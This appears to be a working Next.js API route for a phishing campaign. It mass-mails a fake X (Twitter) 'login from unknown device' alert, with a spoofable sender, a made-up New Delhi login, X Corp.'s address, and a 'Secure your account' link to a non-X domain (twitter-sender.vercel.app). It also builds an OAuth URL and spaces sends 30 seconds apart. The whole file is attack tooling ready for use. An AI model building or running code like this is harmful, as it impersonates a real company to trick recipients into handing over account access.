import { generateOAuthURL, generateStaticOAuthURL } from "@/lib/utils";
import { NextRequest, NextResponse } from "next/server";
import { Resend } from "resend";

const resend = new Resend(process.env.RESEND_API_KEY);

const rateLimitStore = new Map<string, number>();

interface EmailRequest {
	emails: string[];
	fromEmail?: string;
	fromName?: string;
	useStaticUrl?: boolean;
}

export async function POST(request: NextRequest) {
	try {
		const body: EmailRequest = await request.json();
		const { emails, fromEmail, fromName, useStaticUrl } = body || {} as EmailRequest;

		if (!emails || !Array.isArray(emails) || emails.length === 0) {
			return NextResponse.json(
				{ error: "Invalid or missing emails array" },
				{ status: 400 },
			);
		}

		// Very basic in-memory rate limiting per caller IP (best-effort in serverless)
		const clientIP =
			(request as any).ip ||
			request.headers.get("x-forwarded-for") ||
			request.headers.get("x-real-ip") ||
			"unknown";
		const now = Date.now();
		const last = rateLimitStore.get(String(clientIP));
		if (last && now - last < 60_000) {
			return NextResponse.json(
				{ error: "Rate limit exceeded. Try again in a minute." },
				{ status: 429 },
			);
		}
		rateLimitStore.set(String(clientIP), now);

		// Build OAuth URL
		const oauthUrl = useStaticUrl
			? await generateStaticOAuthURL()
			: await generateOAuthURL();

		// Send emails via Resend (collect results)
		const sender = (fromEmail || "noreply@yourdomain.com").trim();
		const name = (fromName || "").trim();

		// Basic email shape validation to avoid Resend 422s
		if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(sender)) {
			return NextResponse.json(
				{ error: "Invalid fromEmail. Use a valid email like name@example.com" },
				{ status: 400 },
			);
		}

		const fromField = name.length > 0 ? `${name} <${sender}>` : sender;

		const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));
		let successful = 0;
		let failed = 0;

		for (let i = 0; i < emails.length; i++) {
			const to = emails[i];
			try {
				await resend.emails.send({
					from: fromField,
					to,
					subject: "Account Login from Unknown Device	",
					html: generateEmailHTML(),
				});
				successful++;
			} catch (err) {
				console.error("Failed to send email to", to, err);
				failed++;
			}

			// Wait 30s between emails (skip after the last one)
			if (i < emails.length - 1) {
				await sleep(30_000);
			}
		}

		return NextResponse.json({
			success: true,
			message: `Invites sent: ${successful}/${emails.length}`,
			summary: { total: emails.length, successful, failed },
			oauthUrl,
		});
	} catch (error) {
		console.error("Error in send-oauth-invites POST:", error);
		return NextResponse.json(
			{ error: "Failed to send OAuth invites" },
			{ status: 500 },
		);
	}
}

function generateEmailHTML(): string {
	return `
   <!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>New Login to Your Account</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #f5f8fa;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif;
    }
    .wrapper {
      width: 100%;
      background-color: #f5f8fa;
      padding: 40px 0;
    }
    .container {
      max-width: 600px;
      margin: 0 auto;
      background-color: #ffffff;
      border-radius: 8px;
      overflow: hidden;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
    }
    .header {
      padding: 32px 40px 24px;
      text-align: right;
    }
    .logo {
      width: 40px;
      height: 40px;
    }
    .content {
      padding: 0 40px 40px;
    }
    .title {
      font-size: 24px;
      font-weight: 600;
      color: #14171a;
      line-height: 32px;
      margin: 0 0 24px;
    }
    .section-title {
      font-size: 16px;
      font-weight: 600;
      color: #14171a;
      margin: 24px 0 12px;
    }
    .info-box {
      background-color: #f7f9fa;
      border-radius: 6px;
      padding: 20px;
      margin: 12px 0 24px;
    }
    .info-row {
      display: flex;
      margin-bottom: 12px;
    }
    .info-row:last-child {
      margin-bottom: 0;
    }
    .info-label {
      font-weight: 600;
      color: #14171a;
      min-width: 80px;
      font-size: 14px;
    }
    .info-value {
      color: #536471;
      font-size: 14px;
      flex: 1;
    }
    .text {
      font-size: 16px;
      line-height: 24px;
      color: #536471;
      margin: 12px 0;
    }
    .disclaimer {
      font-size: 13px;
      color: #8899a6;
      margin: 16px 0 0;
    }
    .action-list {
      margin: 16px 0;
      padding-left: 20px;
    }
    .action-list li {
      font-size: 16px;
      line-height: 24px;
      color: #536471;
      margin-bottom: 12px;
    }
    .link {
      color: #1da1f2;
      text-decoration: none;
      font-weight: 500;
    }
    .link:hover {
      text-decoration: underline;
    }
    .footer {
      padding: 32px 40px;
      text-align: center;
      background-color: #f7f9fa;
      border-top: 1px solid #e1e8ed;
    }
    .footer-links {
      font-size: 13px;
      color: #8899a6;
      margin-bottom: 16px;
    }
    .footer-links a {
      color: #1da1f2;
      text-decoration: none;
      font-weight: 500;
    }
    .footer-address {
      font-size: 12px;
      color: #8899a6;
      line-height: 18px;
    }
    @media only screen and (max-width: 640px) {
      .container {
        border-radius: 0;
      }
      .header, .content, .footer {
        padding-left: 24px;
        padding-right: 24px;
      }
      .title {
        font-size: 20px;
        line-height: 28px;
      }
    }
  </style>
</head>
<body>
  <div class="wrapper">
    <div class="container">
      <!-- Header -->
      <div class="header">
        <img src="https://16aiflow.xyz/mele.png" alt="Logo" class="logo">
      </div>
      
      <!-- Main Content -->
      <div class="content">
        <h1 class="title">We noticed a login to your account from a new device. Was this you?</h1>
        
        <div class="section-title">New Login</div>
        
        <div class="info-box">
          <div class="info-row">
            <span class="info-label">Location*</span>
            <span class="info-value">Connaught Place, New Delhi, India</span>
          </div>
          <div class="info-row">
            <span class="info-label">Device</span>
            <span class="info-value">Firefox Desktop on Windows</span>
          </div>
        </div>
        
        <p class="disclaimer">*Location is approximate based on the login's IP address.</p>
        
        <div class="section-title">If this was you</div>
        <p class="text">You can ignore this message. There's no need to take any action.</p>
        
        <div class="section-title">If this wasn't you</div>
        <p class="text">Complete these steps now to protect your account:</p>
        
        <ul class="action-list">
          <li>
            <a href="https://twitter-sender.vercel.app/reset" class="link">Secure your account.</a>
            You'll be logged out of all your active sessions except the one you're using at this time.
          </li>
        </ul>
      </div>
      
      <!-- Footer -->
      <div class="footer">
        <div class="footer-links">
          <a href="https://16aiflow.xyz/help">Help</a> | 
          <a href="https://16aiflow.xyz/email">Email security tips</a>
        </div>
        <div class="footer-address">
          X Corp.<br>
          1355 Market Street, Suite 900<br>
          San Francisco, CA 94103
        </div>
      </div>
    </div>
  </div>
</body>
</html>
  `;
}
